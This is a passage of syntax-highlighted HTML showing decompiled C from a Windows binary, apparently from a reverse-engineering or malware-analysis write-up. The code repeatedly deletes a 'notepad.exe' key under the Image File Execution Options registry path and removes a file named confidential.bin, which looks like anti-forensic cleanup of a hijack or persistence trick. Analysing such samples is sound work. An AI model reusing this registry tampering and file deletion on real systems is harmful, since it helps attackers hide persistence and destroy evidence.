style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d43\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000338 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d69\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">200\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000338 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d7c\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d81\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140001e00\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d86\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140001eed\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d8b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140001fd0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d9a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">confidential.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000330 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002dcc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Executio n Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000330 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002df2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000330 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002e18\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">200\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000330 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002e2b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000328 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002e5d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000328 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002e77\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000328 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002e8a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000320 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ebc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan 